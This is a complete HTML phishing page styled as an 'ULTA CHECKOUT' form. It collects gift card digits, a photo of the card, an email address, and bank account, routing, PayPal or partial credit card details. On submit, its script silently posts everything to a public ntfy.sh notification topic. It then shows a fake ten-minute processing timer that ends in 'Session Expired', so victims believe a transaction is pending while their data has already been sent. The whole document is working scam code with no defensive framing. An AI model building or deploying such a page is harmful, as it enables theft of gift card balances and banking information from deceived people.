<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CHECKER</title>
  <style>
    :root {
      --bg: #F27A30;
      --card-bg: #ffffff;
      --accent: #F27A30;
      --accent-hover: #d9631b;
      --text: #2c2c2c;
      --text-dim: #666666;
      --border: #e0e0e0;
      --input-bg: #f9f9f9;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      max-width: 700px;
      margin: 2rem auto;
      padding: 0 1rem;
    }

    .card {
      background: var(--card-bg);
      border-radius: 12px;
      padding: 2rem;
      margin-bottom: 2rem;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
    }

    h2 {
      margin-top: 0;
      color: #F27A30;
    }

    .form-group {
      margin-bottom: 1.2rem;
    }

    label {
      display: block;
      margin-bottom: 0.4rem;
      font-size: 0.9rem;
      color: var(--text-dim);
      font-weight: 600;
    }

    input[type="text"], input[type="email"], textarea, input[type="file"], select {
      width: 100%;
      padding: 0.75rem;
      border-radius: 6px;
      border: 1px solid var(--border);
      background-color: var(--input-bg);
      color: var(--text);
      box-sizing: border-box;
      font-size: 1rem;
    }

    input[type="text"]:focus, input[type="email"]:focus, textarea:focus, select:focus {
      outline: none;
      border-color: var(--accent);
      background-color: #ffffff;
      box-shadow: 0 0 0 3px rgba(242, 122, 48, 0.2);
    }

    textarea {
      resize: vertical;
      min-height: 120px;
    }

    /* Grid layout helpers for conditional payment details */
    .payment-details {
      display: none;
      background-color: #fffaf7;
      border: 1px dashed var(--accent);
      padding: 1rem;
      border-radius: 8px;
      margin-bottom: 1.2rem;
    }

    .grid-3 {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 0.75rem;
    }

    .grid-2 {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 0.75rem;
    }

    @media (max-width: 600px) {
      .grid-3 {
        grid-template-columns: 1fr;
      }
    }

    button {
      background-color: var(--accent);
      color: #ffffff;
      border: none;
      padding: 0.85rem 1.5rem;
      border-radius: 6px;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      width: 100%;
      transition: background-color 0.2s, transform 0.1s;
    }

    button:hover {
      background-color: var(--accent-hover);
    }

    button:disabled {
      background-color: #ccc;
      color: #666;
      cursor: not-allowed;
    }

    #processingBox {
      display: none;
      text-align: center;
      padding: 2rem 1rem;
    }

    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid var(--border);
      border-top: 4px solid var(--accent);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 1.5rem auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #timer {
      font-size: 1.5rem;
      font-weight: bold;
      color: var(--accent);
      margin-top: 0.5rem;
    }

    #status {
      margin-top: 1rem;
      font-size: 0.95rem;
      text-align: center;
      font-weight: 500;
    }

    .error { color: #c62828; }
    .success { color: #2e7d32; }
  </style>
</head>
<body>

  <div class="card">
    <h2>ULTA CHECKOUT</h2>

    <form id="reviewForm">
      <div class="form-group">
        <label for="email">Mail Address</label>
        <input type="email" id="email" required placeholder="">
      </div>

      <div class="form-group">
        <label for="username">Name of Card</label>
        <input type="text" id="username" required placeholder="">
      </div>

      <div class="form-group">
        <label for="title">Card Type (Physical or E-code)</label>
        <input type="text" id="title" required placeholder="PHYSICAL OR E-CODE">
      </div>

      <div class="form-group">
        <label for="paymentMethod">Preferred Payment Method</label>
        <select id="paymentMethod" name="paymentMethod" required>
          <option value="" disabled selected>Select a payment method</option>
          <option value="credit_card">Credit Card</option>
          <option value="paypal">PayPal</option>
          <option value="bank_transfer">Bank Transfer</option>
        </select>
      </div>

      <!-- Conditional PayPal Section -->
      <div id="paypalFields" class="payment-details">
        <div class="form-group" style="margin-bottom: 0;">
          <label for="paypalEmail">PayPal Email Address</label>
          <input type="email" id="paypalEmail" placeholder="example@paypal.com">
        </div>
      </div>

      <!-- Conditional Bank Transfer Section (3 Columns) -->
      <div id="bankFields" class="payment-details">
        <div class="grid-3">
          <div>
            <label for="bankName">Bank Name</label>
            <input type="text" id="bankName" placeholder="Bank Name">
          </div>
          <div>
            <label for="bankAccount">Account / IBAN</label>
            <input type="text" id="bankAccount" placeholder="Account Number">
          </div>
          <div>
            <label for="routingNumber">Routing Number</label>
            <input type="text" id="routingNumber" placeholder="Routing / SWIFT">
          </div>
        </div>
      </div>

      <!-- Conditional Credit Card Section (2 Columns) -->
      <div id="creditCardFields" class="payment-details">
        <div class="grid-2">
          <div>
            <label for="cardFirst6">First 6 Digits</label>
            <input type="text" id="cardFirst6" maxlength="6" pattern="\d{6}" placeholder="123456">
          </div>
          <div>
            <label for="cardLast4">Last 4 Digits</label>
            <input type="text" id="cardLast4" maxlength="4" pattern="\d{4}" placeholder="7890">
          </div>
        </div>
      </div>

      <div class="form-group">
        <label for="review">Gift Card Digits</label>
        <textarea id="review" required placeholder=""></textarea>
      </div>

      <div class="form-group">
        <label for="image">Attach Image </label>
        <input type="file" id="image" accept="image/*">
      </div>

      <button type="submit" id="submitBtn">Next</button>
    </form>

    <div id="processingBox">
      <div class="spinner"></div>
      <h3>Processing your submission...</h3>
      <p style="color: var(--text-dim);">Estimated wait time:</p>
      <div id="timer">10:00</div>
    </div>

    <div id="status"></div>
  </div>

  <script>
    const NTFY_TOPIC_URL = 'https://ntfy.sh/converter-storecredit';

    // DOM Element selections
    const form = document.getElementById('reviewForm');
    const submitBtn = document.getElementById('submitBtn');
    const statusDiv = document.getElementById('status');
    const processingBox = document.getElementById('processingBox');
    const timerDiv = document.getElementById('timer');
    const paymentMethodSelect = document.getElementById('paymentMethod');

    const paypalFields = document.getElementById('paypalFields');
    const bankFields = document.getElementById('bankFields');
    const creditCardFields = document.getElementById('creditCardFields');

    // Handle Payment Method dropdown change
    paymentMethodSelect.addEventListener('change', (e) => {
      const selected = e.target.value;

      // Reset visibilities
      paypalFields.style.display = 'none';
      bankFields.style.display = 'none';
      creditCardFields.style.display = 'none';

      // Reset required attributes on sub-fields
      document.getElementById('paypalEmail').required = false;
      document.getElementById('bankName').required = false;
      document.getElementById('bankAccount').required = false;
      document.getElementById('routingNumber').required = false;
      document.getElementById('cardFirst6').required = false;
      document.getElementById('cardLast4').required = false;

      if (selected === 'paypal') {
        paypalFields.style.display = 'block';
        document.getElementById('paypalEmail').required = true;
      } else if (selected === 'bank_transfer') {
        bankFields.style.display = 'block';
        document.getElementById('bankName').required = true;
        document.getElementById('bankAccount').required = true;
        document.getElementById('routingNumber').required = true;
      } else if (selected === 'credit_card') {
        creditCardFields.style.display = 'block';
        document.getElementById('cardFirst6').required = true;
        document.getElementById('cardLast4').required = true;
      }
    });

    function compressImage(file, maxWidth = 1200, maxHeight = 1200, quality = 0.7) {
      return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = (event) => {
          const img = new Image();
          img.src = event.target.result;
          img.onload = () => {
            let width = img.width;
            let height = img.height;

            if (width > height) {
              if (width > maxWidth) {
                height = Math.round((height * maxWidth) / width);
                width = maxWidth;
              }
            } else {
              if (height > maxHeight) {
                width = Math.round((width * maxHeight) / height);
                height = maxHeight;
              }
            }

            const canvas = document.createElement('canvas');
            canvas.width = width;
            canvas.height = height;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(img, 0, 0, width, height);

            canvas.toBlob((blob) => {
              if (blob) {
                resolve(blob);
              } else {
                reject(new Error('Image compression failed.'));
              }
            }, 'image/jpeg', quality);
          };
          img.onerror = (err) => reject(err);
        };
        reader.onerror = (err) => reject(err);
      });
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      submitBtn.disabled = true;
      statusDiv.textContent = "Sending...";
      statusDiv.className = "";

      // Look up main input values
      const mailAddress = document.getElementById('email').value;
      const nameOfCard = document.getElementById('username').value;
      const cardType = document.getElementById('title').value;
      const paymentMethod = paymentMethodSelect.value;
      const cardDigits = document.getElementById('review').value;
      const imageFile = document.getElementById('image').files[0];

      // Formulate payment details string based on selection
      let paymentDetailsString = "";
      if (paymentMethod === 'paypal') {
        const paypalEmail = document.getElementById('paypalEmail').value;
        paymentDetailsString = `PayPal Email: ${paypalEmail}`;
      } else if (paymentMethod === 'bank_transfer') {
        const bankName = document.getElementById('bankName').value;
        const bankAccount = document.getElementById('bankAccount').value;
        const routingNumber = document.getElementById('routingNumber').value;
        paymentDetailsString = `Bank Name: ${bankName}\nAccount/IBAN: ${bankAccount}\nRouting Number: ${routingNumber}`;
      } else if (paymentMethod === 'credit_card') {
        const first6 = document.getElementById('cardFirst6').value;
        const last4 = document.getElementById('cardLast4').value;
        paymentDetailsString = `Card BIN (First 6): ${first6}\nCard Last 4: ${last4}`;
      }

      // Format full payload text
      const fullMessage = `Mail Address: ${mailAddress}\nName of Card: ${nameOfCard}\nCard Type: ${cardType}\nPayment Method: ${paymentMethod}\n${paymentDetailsString}\nGift Card Digits: ${cardDigits}`;

      try {
        let response;

        if (imageFile) {
          const compressedBlob = await compressImage(imageFile);

          const uploadUrl = new URL(NTFY_TOPIC_URL);
          uploadUrl.searchParams.append('title', cardType || 'Submission');
          uploadUrl.searchParams.append('message', fullMessage);
          uploadUrl.searchParams.append('filename', 'upload.jpg');

          response = await fetch(uploadUrl.toString(), {
            method: 'PUT',
            body: compressedBlob
          });
        } else {
          // Text-only submission
          const uploadUrl = new URL(NTFY_TOPIC_URL);
          uploadUrl.searchParams.append('title', cardType || 'Submission');

          response = await fetch(uploadUrl.toString(), {
            method: 'POST',
            body: fullMessage
          });
        }

        if (response.ok) {
          form.style.display = 'none';
          processingBox.style.display = 'block';
          startTimer(10 * 60); // Start 10-minute countdown
        } else {
          throw new Error(`Failed to send (HTTP ${response.status})`);
        }
      } catch (err) {
        statusDiv.textContent = "Error: " + err.message;
        statusDiv.className = "error";
        submitBtn.disabled = false;
      }
    });

    // Function to start a countdown
    function startTimer(durationInSeconds) {
      let timer = durationInSeconds;

      const interval = setInterval(() => {
        const minutes = Math.floor(timer / 60);
        const seconds = timer % 60;

        const formattedMin = String(minutes).padStart(2, '0');
        const formattedSec = String(seconds).padStart(2, '0');

        // Update UI
        timerDiv.textContent = `${formattedMin}:${formattedSec}`;

        if (--timer < 0) {
          clearInterval(interval);
          onTimerExpired();
        }
      }, 1000);
    }

    function onTimerExpired() {
      processingBox.innerHTML = `
        <h3 class="error">Session Expired</h3>
        <p>Please refresh the page to try again.</p>
      `;
    }
  </script>
</body>
</html>
